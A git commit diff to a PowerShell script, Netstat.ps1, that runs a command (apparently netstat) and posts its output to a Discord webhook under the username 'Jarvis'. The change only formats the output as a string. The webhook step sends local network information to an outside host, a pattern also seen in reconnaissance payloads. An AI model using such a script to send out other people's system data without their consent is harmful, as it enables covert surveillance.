b341bde923b3b6d9903912c206332753cb535a91
WarDog712 <102789375+WarDog712@users.noreply.github.com>
2023-11-20 23:03:41 +0100

    Update Netstat.ps1

--- Netstat.ps1
+++ Netstat.ps1
@@ -8,6 +8,6 @@ $output = Invoke-Expression $command
 # Invia il messaggio su Discord
 $payload = @{
   'username' = 'Jarvis'
-  'content' = $output
+  'content' = $output | Out-String
 }
 Invoke-RestMethod -ContentType 'Application/Json' -Method POST -Uri $webhook -Body ($payload | ConvertTo-Json)
